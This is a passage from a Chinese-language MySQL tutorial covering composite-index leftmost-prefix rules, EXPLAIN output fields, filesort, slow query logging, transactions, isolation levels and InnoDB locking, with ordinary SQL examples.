class="string">&#x27;John&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这个查询首先使用了 <code>last_name</code>，然后使用了 <code>first_name</code>，符合最左前缀原则，可以有效地使用复合索引。</p><ol start="2"><li><strong>只匹配最左前缀的一部分</strong>：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;Smith&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这个查询仅使用了索引的第一个列 <code>last_name</code>，它也可以有效地使用这个复合索引。</p><ol start="3"><li><strong>匹配最左前缀的一部分但不完全</strong>：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> first_name <span class="operator">=</span> <span class="string">&#x27;John&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这个查询只使用了索引的第二列 <code>first_name</code>，没有使用索引的第一个列 <code>last_name</code>。根据最左前缀原则，<strong>这个查询不能有效使用复合索引</strong>。它可以使用其他索引（如果存在的话），但不会使用 <code>idx_name</code> 这个复合索引。</p><ol start="4"><li><strong>跳过最左前缀的一部分</strong>：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> hire_date <span class="operator">=</span> <span class="string">&#x27;2022-01-01&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这个查询使用了索引中的第三列 <code>hire_date</code>，但它跳过了前两列 <code>last_name</code> 和 <code>first_name</code>，<strong>所以也不能使用复合索引</strong>。</p><ol start="5"><li><strong>LIKE 查询</strong></li></ol><ul><li><code>LIKE &#39;abc%&#39;</code> 可以使用 B+ 树范围查找</li><li><code>LIKE &#39;%abc&#39;</code> 无法使用索引（前缀不确定）</li><li><code>LIKE &#39;a_b%&#39;</code> 仍然能走索引</li><li><code>WHERE name LIKE &#39;abc%&#39; AND age = 30</code> name 是前缀，但 age 是索引最左字段，没用</li></ul><h3 id="Bonus"><a href="#Bonus" class="headerlink" title="Bonus"></a>Bonus</h3><p>经过测试，MYSQL的优化器会自动调整查询的过滤条件的顺序，以自动匹配最左前缀原则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create index idx_test on ds_vul(source, fixed_time)</span><br><span class="line"></span><br><span class="line">-- 匹配</span><br><span class="line">explain select * from ds_vul where fixed_time &gt; &quot;2020-01-01&quot; and source =&#x27;vim&#x27; </span><br><span class="line"></span><br><span class="line">-- 也匹配，因为MYSQL优化器会自动调整顺序</span><br><span class="line">explain select * from ds_vul where source =&#x27;vim&#x27; and fixed_time &gt; &quot;2020-01-01&quot;</span><br><span class="line"></span><br><span class="line">-- 不匹配</span><br><span class="line">explain select * from ds_vul where fixed_time &gt; &#x27;2020-01-01&#x27;;</span><br></pre></td></tr></table></figure><h3 id="为什么最左前缀原则如此重要"><a href="#为什么最左前缀原则如此重要" class="headerlink" title="为什么最左前缀原则如此重要"></a>为什么最左前缀原则如此重要</h3><ul><li><strong>复合索引的性能优化</strong>：复合索引是为了加速包含多个列的查询，但它的顺序非常重要。如果查询条件没有按照索引列的顺序提供，数据库引擎将无法有效使用该索引。</li><li><strong>查询效率</strong>：如果查询的列顺序与复合索引的顺序不匹配，数据库必须回退到全表扫描或其他不太高效的查询方式，从而影响查询效率。</li></ul><h3 id="如何优化"><a href="#如何优化" class="headerlink" title="如何优化"></a>如何优化</h3><ol><li><strong>合理设计索引顺序</strong>：根据查询模式来设计索引的列顺序。将最常用的查询列放在复合索引的最左边，以确保查询时能够充分利用索引。</li><li><strong>避免不必要的列</strong>：如果某些列在查询中使用的频率较低，可以考虑不将它们放在复合索引的最左侧，或者通过单独的索引来优化。</li><li><strong>覆盖索引</strong>：如果查询仅涉及复合索引中的列，可以利用覆盖索引（covering index），避免回表查询，从而提高查询效率。</li></ol><h1 id="SQL-查询优化和执行计划分析"><a href="#SQL-查询优化和执行计划分析" class="headerlink" title="SQL 查询优化和执行计划分析"></a><strong>SQL 查询优化和执行计划分析</strong></h1><h2 id="SQL-查询的执行顺序"><a href="#SQL-查询的执行顺序" class="headerlink" title="SQL 查询的执行顺序"></a>SQL 查询的执行顺序</h2><p>你写的是这样：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">18</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> created_at;</span><br></pre></td></tr></table></figure><p>但 MySQL 实际上是按照这个顺序执行的：</p><ol><li><code>FROM</code>（先确定要从哪张表查）</li><li><code>WHERE</code>（先过滤数据）</li><li><code>GROUP BY</code>（如果有分组先分组）</li><li><code>HAVING</code>（对分组后的数据再过滤）</li><li><code>SELECT</code>（确定要查哪些字段）</li><li><code>ORDER BY</code>（最后排序）</li><li><code>LIMIT</code>（控制输出条数）</li></ol><hr><h2 id="怎么用-EXPLAIN-看执行计划"><a href="#怎么用-EXPLAIN-看执行计划" class="headerlink" title="怎么用 EXPLAIN 看执行计划"></a>怎么用 EXPLAIN 看执行计划</h2><p><code>EXPLAIN</code> 是调试 SQL 性能的关键工具。可以这么用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">18</span>;</span><br></pre></td></tr></table></figure><p>它会输出一堆字段，几个核心的要会看：</p><ul><li><code>type</code>：连接类型，越靠近 <code>const</code> 越好（顺序大概是：ALL &gt; index &gt; range &gt; ref &gt; eq_ref &gt; const）</li><li><code>possible_keys</code>：MySQL 觉得哪些索引可以用</li><li><code>key</code>：实际用了哪个索引</li><li><code>rows</code>：大概扫描了多少行</li><li><code>Extra</code>：有没有 “Using filesort”、“Using temporary” 这类提示，说明有潜在问题</li></ul><h3 id="常见提示的含义"><a href="#常见提示的含义" class="headerlink" title="常见提示的含义"></a>常见提示的含义</h3><ul><li><code>ALL</code>：全表扫描，通常不是好事</li><li><code>Using filesort</code>：用到了额外排序操作，效率较低</li><li><code>Using temporary</code>：中间生成了临时表，占内存或磁盘，注意优化</li></ul><hr><h2 id="怎么找出慢查询"><a href="#怎么找出慢查询" class="headerlink" title="怎么找出慢查询"></a>怎么找出慢查询</h2><p>可以开启 MySQL 的 <strong>慢查询日志</strong>，用来记录那些执行时间超过某个阈值的 SQL。</p><p>设置方式（示例）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 开启慢查询日志</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置记录阈值，比如超过 1 秒的记录</span></span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> long_query_time <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置记录日志的文件路径（一般默认就有）</span></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;slow_query_log_file&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后可以分析这些日志，看看哪些 SQL 是“拖后腿的家伙”。</p><hr><h2 id="常用-SQL-优化技巧"><a href="#常用-SQL-优化技巧" class="headerlink" title="常用 SQL 优化技巧"></a>常用 SQL 优化技巧</h2><h3 id="1-SELECT-需要啥就写啥，别用-SELECT"><a href="#1-SELECT-需要啥就写啥，别用-SELECT" class="headerlink" title="1. SELECT 需要啥就写啥，别用 SELECT *"></a>1. SELECT 需要啥就写啥，别用 <code>SELECT *</code></h3><ul><li><code>SELECT *</code> 会返回所有字段，拖慢速度</li><li>表结构一改，程序可能挂</li><li>更难走索引覆盖</li></ul><h3 id="2-建合适的索引"><a href="#2-建合适的索引" class="headerlink" title="2. 建合适的索引"></a>2. 建合适的索引</h3><ul><li>经常查的字段加索引，比如 <code>WHERE</code>、<code>JOIN</code>、<code>ORDER BY</code> 里出现的</li><li>组合索引按使用顺序排，记住“最左前缀”</li><li>不要滥用索引，写操作多的表慎重</li></ul><h3 id="3-使用-LIMIT-索引分页"><a href="#3-使用-LIMIT-索引分页" class="headerlink" title="3. 使用 LIMIT + 索引分页"></a>3. 使用 <code>LIMIT</code> + 索引分页</h3><p>大分页特别慢，比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> big_table LIMIT <span class="number">100000</span>, <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p>可以用 <strong>延迟分页</strong> 优化：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> big_table <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> 上次最后一条的id LIMIT <span class="number">20</span>;</span><br></pre></td></tr></table></figure><p>这样可以用上索引，避免跳过大量无用数据。</p><h3 id="4-注意函数和隐式转换"><a href="#4-注意函数和隐式转换" class="headerlink" title="4. 注意函数和隐式转换"></a>4. 注意函数和隐式转换</h3><p>这些都可能让索引失效：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> <span class="type">DATE</span>(created_at) <span class="operator">=</span> <span class="string">&#x27;2024-01-01&#x27;</span>  <span class="comment">-- 会失效</span></span><br><span class="line"><span class="keyword">WHERE</span> created_at <span class="operator">&gt;=</span> <span class="string">&#x27;2024-01-01&#x27;</span> <span class="keyword">AND</span> created_at <span class="operator">&lt;</span> <span class="string">&#x27;2024-01-02&#x27;</span>  <span class="comment">-- 推荐这样写</span></span><br></pre></td></tr></table></figure><p>类型不一致也会让索引失效：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;123&#x27;</span>  <span class="comment">-- 如果 id 是 INT 类型，这样写可能导致类型转换</span></span><br></pre></td></tr></table></figure><hr><h2 id="常见问题整理"><a href="#常见问题整理" class="headerlink" title="常见问题整理"></a>常见问题整理</h2><h3 id="为什么明明有索引，SQL-还是很慢"><a href="#为什么明明有索引，SQL-还是很慢" class="headerlink" title="为什么明明有索引，SQL 还是很慢"></a>为什么明明有索引，SQL 还是很慢</h3><ul><li>索引字段用错了位置，比如用了函数</li><li>查询字段太多，回表成本高</li><li>数据量太少，MySQL 判断全表扫描更快</li><li>没走覆盖索引（select 的字段不在索引里）</li></ul><h3 id="怎么判断是否走了“覆盖索引”"><a href="#怎么判断是否走了“覆盖索引”" class="headerlink" title="怎么判断是否走了“覆盖索引”"></a>怎么判断是否走了“覆盖索引”</h3><p><code>EXPLAIN</code> 里 <code>Extra</code> 出现 <code>Using index</code>，说明是走了覆盖索引（不需要回表）</p><h3 id="什么是-filesort，为什么要避免"><a href="#什么是-filesort，为什么要避免" class="headerlink" title="什么是 filesort，为什么要避免"></a>什么是 filesort，为什么要避免</h3><p>MySQL 发现没法用索引排序，就会启用 filesort，可能会写磁盘，效率低。避免它的方法：</p><ul><li>对排序字段加索引</li><li>避免 <code>ORDER BY</code> 排多个不相关字段</li><li>限制返回结果行数（比如加 <code>LIMIT</code>）</li></ul><h1 id="EXPLAIN"><a href="#EXPLAIN" class="headerlink" title="EXPLAIN"></a>EXPLAIN</h1><p><code>EXPLAIN</code> 是 MySQL 用来查看 SQL 执行计划的命令，可以帮助分析 SQL 是否使用了索引，是否存在性能问题。通过它可以提前预判一条 SQL 的执行路径，而不是靠“感觉”去优化。</p><p>适用于 <code>SELECT</code>、<code>DELETE</code>、<code>INSERT</code>、<code>REPLACE</code>、<code>UPDATE</code> 等语句（但最常用于 <code>SELECT</code>）。</p><hr><h2 id="如何使用-EXPLAIN？"><a href="#如何使用-EXPLAIN？" class="headerlink" title="如何使用 EXPLAIN？"></a>如何使用 EXPLAIN？</h2><p>用法非常简单，只需要在查询语句前面加上 <code>EXPLAIN</code> 即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN <span class="keyword">SELECT</span> name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> age <span class="operator">&gt;</span> <span class="number">25</span>;</span><br></pre></td></tr></table></figure><p>MySQL 会返回一个表格，包含若干列，每列都对应一个执行计划的关键字段。理解这些字段，是掌握 SQL 调优的关键。</p><hr><h2 id="EXPLAIN-的输出字段详解"><a href="#EXPLAIN-的输出字段详解" class="headerlink" title="EXPLAIN 的输出字段详解"></a>EXPLAIN 的输出字段详解</h2><h3 id="id"><a href="#id" class="headerlink" title="id"></a>id</h3><p>表示查询中每个 SELECT 子句或操作的编号，数字越大表示优先级越高。简单查询通常只有一行，复杂查询（如子查询、联合查询）会出现多行。</p><ul><li><code>id</code> 相同：表示是一个查询块</li><li><code>id</code> 不同：先执行 id 值大的</li></ul><h3 id="select-type"><a href="#select-type" class="headerlink" title="select_type"></a>select_type</h3><p>表示查询的类型，常见的有：</p><ul><li><code>SIMPLE</code>：简单查询，不包含子查询或 UNION</li><li><code>PRIMARY</code>：最外层的查询</li><li><code>SUBQUERY</code>：在 <code>SELECT</code> 或 <code>WHERE</code> 中出现的子查询</li><li><code>DERIVED</code>：出现在 <code>FROM</code> 子句中的子查询（派生表）</li><li><code>UNION</code>：UNION 中的第二个或后续查询</li><li><code>DEPENDENT SUBQUERY</code>：依赖外层查询结果的子查询</li></ul><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><p>表示当前这一步操作涉及到的表名，可能是具体表名、临时表，或者 <code>derivedN</code>（派生表）。</p><h3 id="type"><a href="#type" class="headerlink" title="type"></a>type</h3><p>以下是 <code>EXPLAIN</code> 中 <code>type</code> 字段的所有取值及其含义，从最差到最好，按性能排序：</p><table><thead><tr><th>type</th><th>含义描述</th><th>是否使用索引</th><th>性能等级</th><th>常见场景示例</th></tr></thead><tbody><tr><td>ALL</td><td>全表扫描，逐行检查数据</td><td>否</td><td>最差</td><td>没有索引或查询条件无法使用索引</td></tr><tr><td>index</td><td>全索引扫描，扫描整个索引</td><td>是</td><td>较差</td><td>覆盖索引但没有过滤条件，如只查询索引字段</td></tr><tr><td>range</td><td>范围扫描，使用索引的范围条件</td><td>是</td><td>较好</td><td><code>&lt;</code>, <code>&gt;</code>, <code>BETWEE</code>, <code>LIKE &#39;abc%&#39;</code> 等范围查询</td></tr><tr><td>index_merge</td><td>使用多个单列索引并合并结果</td><td>是</td><td>一般</td><td>多个字段各自有索引，如 <code>col1 = 1 OR col2 = 2</code></td></tr><tr><td>ref_or_null</td><td>类似 ref，但同时处理 <code>IS NULL</code> 情况</td><td>是</td><td>一般</td><td><code>col = ? OR col IS NULL</code></td></tr><tr><td>ref</td><td>非唯一索引等值匹配</td><td>是</td><td>好</td><td><code>col = ?</code>，其中 col 是普通索引字段</td></tr><tr><td>eq_ref</td><td>唯一索引等值匹配，一次返回一条记录</td><td>是</td><td>很好</td><td>多表 JOIN 时，通过主键或唯一索引进行连接</td></tr><tr><td>const</td><td>主键或唯一索引等值查询，最多返回一条</td><td>是</td><td>最优</td><td><code>WHERE id = 1</code>，id 是主键或唯一索引</td></tr><tr><td>system</td><td>表只有一行（系统表）</td><td>是</td><td>最优</td><td>极少见，仅用于单行系统表</td></tr></tbody></table><p>说明：</p><ul><li><code>ALL</code> 和 <code>index</code> 会全扫描，性能差；</li><li><code>range</code>、<code>ref</code> 是常见且推荐使用的索引访问方式；</li><li><code>eq_ref</code> 和 <code>const</code> 是最优形式，查询效率极高；</li><li><code>const</code> &#x2F; <code>system</code>：一次匹配一行（几乎不耗资源）</li></ul><p>推荐至少使用 <code>range</code> 级别，理想状态是 <code>ref</code> 或 <code>eq_ref</code>。</p><h3 id="possible-keys"><a href="#possible-keys" class="headerlink" title="possible_keys"></a>possible_keys</h3><p>表示 MySQL 认为可能使用的索引列表，基于查询条件来判断。</p><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>表示实际使用的索引，如果为 <code>NULL</code>，说明没有用到任何索引。</p><h3 id="key-len"><a href="#key-len" class="headerlink" title="key_len"></a>key_len</h3><p>表示使用的索引长度（单位是字节），可以用来判断索引是否被“用全”。</p><p>比如索引是 <code>(name, age)</code>，但 SQL 只用了 <code>name</code>，那 <code>key_len</code> 就只体现了 <code>name</code> 的长度。</p><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p>表示使用哪个字段或常量与索引进行比较。常见值：</p><ul><li><code>const</code>：与常量比较</li><li><code>func</code>：使用函数</li><li><code>NULL</code>：没用上</li></ul><h3 id="rows"><a href="#rows" class="headerlink" title="rows"></a>rows</h3><p>MySQL 预估本次执行需要扫描的行数。这个值越小越好，是判断是否走索引的直接指标。</p><p>需要注意的是，它只是预估值，不一定完全准确。</p><h3 id="filtered"><a href="#filtered" class="headerlink" title="filtered"></a>filtered</h3><p>表示在读取到 <code>rows</code> 行数据后，经过 <code>WHERE</code> 条件过滤后剩下的比例。比如 100 行中 10 行满足条件，那就是 <code>10.0</code>。</p><p>这个字段可以结合 <code>rows</code> 看最终参与返回的行数。</p><h3 id="Extra"><a href="#Extra" class="headerlink" title="Extra"></a>Extra</h3><p>这是执行计划中最值得关注的一列，包含一些额外信息，常见的有：</p><ul><li><code>Using index</code>：用了覆盖索引（非常好）</li><li><code>Using where</code>：用了 <code>WHERE</code> 条件过滤</li><li><code>Using filesort</code>：需要额外排序操作（可能影响性能）</li><li><code>Using temporary</code>：使用了临时表（比如 <code>GROUP BY</code>、<code>ORDER BY</code>）</li><li><code>Impossible WHERE</code>：永远不可能成立的条件，比如 <code>WHERE 1=0</code></li></ul><hr><h2 id="判断是否使用了索引"><a href="#判断是否使用了索引" class="headerlink" title="判断是否使用了索引"></a>判断是否使用了索引</h2><p>优先关注这几列的值：</p><ul><li><code>type</code>：如果是 <code>ALL</code> 或 <code>index</code>，说明没走有效索引</li><li><code>key</code>：是否非 NULL，代表是否实际用上索引</li><li><code>Extra</code>：是否出现 <code>Using filesort</code> 或 <code>Using temporary</code></li></ul><p>一个比较理想的结果是：</p><ul><li><code>type = ref</code> 或更优</li><li><code>key</code> 有值</li><li><code>rows</code> 很少</li><li><code>Extra</code> 里有 <code>Using index</code> 而没有 <code>Using filesort</code> 和 <code>Using temporary</code></li></ul><hr><h1 id="filesort"><a href="#filesort" class="headerlink" title="filesort"></a>filesort</h1><p><strong>filesort</strong> 是 MySQL 用来处理 <strong>排序操作</strong> 的一种机制。当查询需要对结果进行排序时（如 <code>ORDER BY</code> 子句），MySQL 会使用 <code>filesort</code> 来完成排序操作。这个名字有点误导，因为它并不总是涉及文件系统排序，实际上它通常是在内存中进行的排序。</p><h2 id="何时发生-filesort"><a href="#何时发生-filesort" class="headerlink" title="何时发生 filesort"></a>何时发生 filesort</h2><p><code>filesort</code> 发生在以下情况下：</p><ul><li>查询涉及 <code>**ORDER BY**</code> 子句。</li><li>在某些情况下，MySQL 无法利用现有的索引来直接进行排序，于是它会将结果临时存储在内存或磁盘中进行排序。</li></ul><p><code>filesort</code> 的性能问题通常是因为排序的数据量较大，无法完全放入内存，导致 MySQL 需要将部分数据写入临时磁盘文件。</p><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>假设有一个 <code>users</code> 表，查询需要按 <code>age</code> 列排序：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> age;</span><br></pre></td></tr></table></figure><p>如果 <code>**age**</code> 列没有索引，或者现有索引不能直接支持排序（比如不包含全部需要的排序列），MySQL 就会使用 <code>filesort</code> 来进行排序。<code>EXPLAIN</code> 输出中会显示 <code>Extra</code> 列为 <code>Using filesort</code>，表示查询使用了 <code>filesort</code>。</p><h2 id="filesort-的工作原理"><a href="#filesort-的工作原理" class="headerlink" title="filesort 的工作原理"></a>filesort 的工作原理</h2><ul><li><strong>内存排序</strong>：如果排序的数据集较小，并且 MySQL 配置允许使用足够的内存（通过 <code>sort_buffer_size</code> 配置项），那么 MySQL 会在内存中完成排序。</li><li><strong>磁盘排序</strong>：如果排序的数据集太大，无法完全放入内存，MySQL 会将数据写入临时磁盘文件，然后进行排序。这个过程通常比内存排序慢得多。</li></ul><hr><h1 id="事务和锁"><a href="#事务和锁" class="headerlink" title="事务和锁"></a>事务和锁</h1><h2 id="什么是事务"><a href="#什么是事务" class="headerlink" title="什么是事务"></a>什么是事务</h2><p>事务（Transaction）是一组操作的集合，要么全部执行成功，要么全部失败回滚。它的目标是保证数据的正确性和一致性。</p><p>MySQL 默认的 InnoDB 引擎是支持事务的。</p><p>事务的四大特性也经常被提起：</p><ul><li>原子性（Atomicity）：事务要么全部执行，要么全部不执行</li><li>一致性（Consistency）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7">约束</a>、<a href="https://zh.wikipedia.org/wiki/%E8%A7%A6%E5%8F%91%E5%99%A8_(%E6%95%B0%E6%8D%AE%E5%BA%93)">触发器</a>、<a href="https://zh.wikipedia.org/wiki/%E7%BA%A7%E8%81%94%E5%9B%9E%E6%BB%9A">级联回滚</a>等</li><li>隔离性（Isolation）：事务之间互不干扰</li><li>持久性（Durability）：事务提交后修改会永久保存</li></ul><h2 id="如何使用事务"><a href="#如何使用事务" class="headerlink" title="如何使用事务"></a>如何使用事务</h2><p>可以在 SQL 中手动控制事务：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">START</span> TRANSACTION;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">-</span> <span class="number">100</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> accounts <span class="keyword">SET</span> balance <span class="operator">=</span> balance <span class="operator">+</span> <span class="number">100</span> <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COMMIT</span>;  <span class="comment">-- 提交</span></span><br><span class="line"><span class="comment">-- 或者</span></span><br><span class="line"><span class="keyword">ROLLBACK</span>;  <span class="comment">-- 回滚</span></span><br></pre></td></tr></table></figure><p>默认情况下，MySQL 是自动提交的。每条语句执行完就自动提交。如果想关闭：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> autocommit <span class="operator">=</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>执行完再手动提交。</p><h2 id="事务提交失败时会回滚到哪里"><a href="#事务提交失败时会回滚到哪里" class="headerlink" title="事务提交失败时会回滚到哪里"></a>事务提交失败时会回滚到哪里</h2><p>事务中只要没提交（commit），就不会对实际数据生效。发生异常时可以通过 <code>ROLLBACK</code> 撤销未提交的改动。</p><h2 id="隔离级别"><a href="#隔离级别" class="headerlink" title="隔离级别"></a>隔离级别</h2><p><strong>隔离级别的四种类型：</strong></p><ol><li><strong>读未提交（Read Uncommitted）</strong></li><li><strong>读已提交（Read Committed）</strong></li><li><strong>可重复读（Repeatable Read），默认</strong></li><li><strong>串行化（Serializable）</strong></li></ol><hr><p><strong>读未提交（Read Uncommitted）</strong></p><ul><li><strong>定义</strong>：事务可以读取另一个未提交事务的数据。换句话说，一个事务可以读取到其他事务正在修改的数据（<strong>脏读</strong>）。</li><li><strong>问题</strong>：<ul><li><strong>脏读（Dirty Read）</strong>：一个事务读取到另一个事务尚未提交的数据。假如另一个事务回滚了，这个读取到的数据就不再有效，导致不一致性。</li></ul></li><li><strong>使用场景</strong>：通常很少使用，因为它可能会导致数据不一致，但在某些极其宽松的一致性要求下，可能会用到。</li><li><strong>示例</strong>： 事务 A 修改数据，但尚未提交，事务 B 读取了该数据，随后事务 A 回滚。事务 B 读取的数据是无效的。</li></ul><p><strong>读已提交（Read Committed）</strong></p><ul><li><strong>定义</strong>：一个事务只能读取已经提交的事务的数据。即，事务 A 不会读取事务 B 修改但尚未提交的数据。</li><li><strong>问题</strong>：<ul><li><strong>不可重复读（Non-repeatable Read）</strong>：事务 A 在同一事务中多次读取相同的记录，事务 B 可能在事务 A 读取两次之间修改了这条记录，导致事务 A 得到不同的值。</li></ul></li><li><strong>使用场景</strong>：适用于大多数普通的数据库应用场景，确保了数据不会出现脏读。</li><li><strong>示例</strong>： 事务 A 读取某行数据，事务 B 修改了这行数据并提交，事务 A 再次读取同一行数据，发现内容已改变。</li></ul><hr><p><strong>可重复读（Repeatable Read）</strong></p><ul><li><strong>定义</strong>：在同一个事务中，多次读取相同的数据结果是相同的。事务 A 在执行期间，事务 B 不能修改事务 A 已读取的数据。MySQL 默认的隔离级别是可重复读。</li><li><strong>问题</strong>：<ul><li><strong>幻读（Phantom Read）</strong>：事务 A 读取某个范围内的记录，事务 B 插入了新的记录，事务 A 重新读取该范围时，发现结果集发生了变化。在 MySQL 中，<code>**Repeatable Read**</code> 隔离级别默认会使用 <strong>“间隙锁（Gap Lock）”</strong> 来防止幻读。它会锁住数据行和数据行之间的间隙，防止其他事务在该间隙插入新记录，从而避免幻读的发生。</li></ul></li><li><strong>使用场景</strong>：适用于大多数场景，尤其是在需要保证数据一致性的情况下，例如银行转账操作。</li><li><strong>示例</strong>： 事务 A 读取账户余额，事务 B 插入了新的账户，事务 A 再次读取账户余额时，发现余额发生变化。</li></ul><hr><p><strong>串行化（Serializable）</strong></p><ul><li><strong>定义</strong>：最严格的隔离级别，所有事务按顺序执行，避免了脏读、不可重复读和幻读。事务 A 执行时，其他事务无法访问正在处理的数据。</li><li><strong>问题</strong>：<ul><li><strong>性能下降</strong>：由于所有事务都需要按顺序执行，数据库的并发性大大降低，吞吐量和响应速度会受到影响。</li></ul></li><li><strong>使用场景</strong>：适用于对数据一致性要求极高的场景，通常用于一些非常关键的操作。</li><li><strong>示例</strong>： 事务 A 和事务 B 都试图同时修改相同的数据行，数据库会强制事务 A 等待事务 B 完成。</li></ul><p>设置隔离级别：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;</span><br></pre></td></tr></table></figure><p>查看当前隔离级别：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@tx_isolation</span>;</span><br></pre></td></tr></table></figure><hr><h2 id="MySQL-锁机制概览"><a href="#MySQL-锁机制概览" class="headerlink" title="MySQL 锁机制概览"></a>MySQL 锁机制概览</h2><p>InnoDB 提供了多种类型的锁机制，用来控制并发：</p><h3 id="表锁-vs-行锁"><a href="#表锁-vs-行锁" class="headerlink" title="表锁 vs 行锁"></a>表锁 vs 行锁</h3><ul><li><strong>表锁</strong>：一锁整个表，简单粗暴，MyISAM 用的是这个</li><li><strong>行锁</strong>：只锁相关记录，InnoDB 支持，粒度更细，效率高</li></ul><h3 id="意向锁（意向共享锁IS-意向排他锁IX）"><a href="#意向锁（意向共享锁IS-意向排他锁IX）" class="headerlink" title="意向锁（意向共享锁IS &#x2F; 意向排他锁IX）"></a>意向锁（意向共享锁IS &#x2F; 意向排他锁IX）</h3><p>用来表示某行上是否已有锁，是表锁和行锁之间的桥梁，性能更高。</p><p><strong>意向锁的两种类型</strong></p><ul><li><strong>意向共享锁（IS, Intention Shared）</strong>：表示“打算对某些行加共享锁”</li><li><strong>意向排他锁（IX, Intention Exclusive）</strong>：表示“打算对某些行加排他锁”</li></ul><p>举个例子：</p><p><code>SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE;</code></p><p>这条语句对 id &#x3D; 1 加了共享锁（S锁），同时 InnoDB 会在整张 users 表上加一个 意向共享锁（IS）。</p><p>同理：</p><p><code>SELECT * FROM users WHERE id = 1 FOR 